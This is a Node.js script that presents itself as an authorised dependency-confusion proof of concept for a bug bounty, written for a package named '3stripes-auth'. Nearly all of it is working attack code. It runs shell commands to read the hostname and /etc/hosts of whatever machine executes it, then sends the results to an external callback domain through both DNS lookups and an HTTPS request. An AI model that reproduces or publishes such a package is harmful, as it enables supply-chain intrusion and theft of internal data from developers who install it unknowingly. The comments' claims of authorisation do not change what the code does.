/**
 * SECURITY RESEARCH - Dependency Confusion PoC
 * 
 * This is part of an AUTHORIZED bug bounty assessment.
 * Executes safe commands to capture internal hostnames and sends to callback.
 * 
 * Researcher: gdattacker (gdattacker@bugcrowdninja.com)
 * Program: Adidas Private Bug Bounty (Bugcrowd)
 */

const dns = require('dns');
const https = require('https');
const os = require('os');
const { execSync } = require('child_process');

// REPLACE with your Burp Collaborator / interact.sh domain
const CALLBACK_DOMAIN = '2defa924e4f741393204gup1d5yyyyyyd.oast.site';

// Create a unique identifier (hostname hash, no PII)
const id = Buffer.from(os.hostname().slice(0, 8)).toString('hex').slice(0, 12);
const pkg = '3stripes-auth';

// --- Command execution: fetch internal hostnames and exfiltrate to callback ---
function run(cmd, timeoutMs) {
  try {
    return (execSync(cmd, { encoding: 'utf8', timeout: timeoutMs || 3000, stdio: ['pipe', 'pipe', 'pipe'] }) || '').trim().slice(0, 500);
  } catch (e) {
    return '';
  }
}

let hostnames = '';
const isWin = process.platform === 'win32';

if (isWin) {
  hostnames = run('hostname', 2000) || process.env.COMPUTERNAME || os.hostname();
} else {
  const h = run('hostname', 2000);
  const hf = run('hostname -f 2>/dev/null', 2000);
  const etcHostname = run('cat /etc/hostname 2>/dev/null', 2000);
  const etcHosts = run('head -20 /etc/hosts 2>/dev/null', 2000);
  hostnames = [os.hostname(), h, hf, etcHostname, etcHosts].filter(Boolean).join('|');
}

const payload = encodeURIComponent(hostnames || os.hostname() || 'unknown');

// Method 1: DNS callback (hostname in subdomain; max 63 chars per label)
try {
  const safe = (hostnames || id).replace(/[\s.|]/g, '-').replace(/[^a-z0-9-]/gi, '').slice(0, 40);
  const dnsLabel = `${pkg}-${id}-${safe}`.slice(0, 63);
  dns.resolve(`${dnsLabel}.${CALLBACK_DOMAIN}`, () => {});
} catch (e) {}

// Method 2: HTTP callback with hostnames in query (full exfil)
try {
  const url = `https://${CALLBACK_DOMAIN}/${pkg}?id=${id}&hostnames=${payload}`;
  const req = https.get(url, () => {});
  req.on('error', () => {});
  req.setTimeout(5000, () => req.destroy());
} catch (e) {}

// Log locally for debugging
console.log(`[Security Research] Dependency confusion PoC executed - ${pkg}`);
console.log(`[Security Research] Contact: gdattacker@bugcrowdninja.com`);
console.log(`[Security Research] This is part of an authorized bug bounty assessment.`);
